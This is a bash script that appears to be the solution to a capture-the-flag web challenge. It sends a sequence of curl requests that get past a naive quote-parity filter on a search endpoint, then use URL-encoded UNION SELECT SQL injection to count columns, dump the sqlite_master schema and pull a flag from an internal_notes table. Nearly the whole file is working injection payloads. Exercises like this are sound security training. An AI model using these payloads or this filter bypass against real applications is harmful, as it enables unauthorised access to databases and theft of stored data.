#!/usr/bin/env bash
# CryoVault 2026 — "The Hidden Test Case" (Web / SQL Injection)
# Target: https://isfcrpesu-hidden-test-case.chals.io  (LeetVault)
#
# Vulnerable endpoint: GET /api/problems?search=<query>
# The app rejects any query with an ODD number of single quotes (naive
# quote-balance filter), but an EVEN number sails through unsanitised.
# That lets us break out of the LIKE clause with a UNION SELECT.
#
# Reproduces exactly the requests used to recover the flag.

set -euo pipefail
BASE="https://isfcrpesu-hidden-test-case.chals.io"

echo "== 1. baseline (sanity) =="
curl -sS "$BASE/api/problems?search=array"

echo
echo "== 2. confirm the quote-parity filter (odd quotes -> 400) =="
curl -sS -i "$BASE/api/problems?search=%27"

echo
echo "== 3. even-quote OR bypass still returns only public rows =="
curl -sS -i "$BASE/api/problems?search=%27%20OR%20%271%27%3D%271"

echo
echo "== 4. confirm column count (4) with a NULL UNION probe =="
curl -sS "$BASE/api/problems?search=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20%27"

echo
echo "== 5. dump schema via sqlite_master =="
curl -sS "$BASE/api/problems?search=%27%20UNION%20SELECT%20name%2Ctype%2Csql%2C1%20FROM%20sqlite_master--%20%27"

echo
echo "== 6. pull internal_notes directly -- this contains the flag =="
curl -sS "$BASE/api/problems?search=%27%20UNION%20SELECT%20id%2Cnote_type%2Ccontent%2Ccreated_at%20FROM%20internal_notes--%20%27" \
  | grep -o 'isfcr{[^}"]*}'
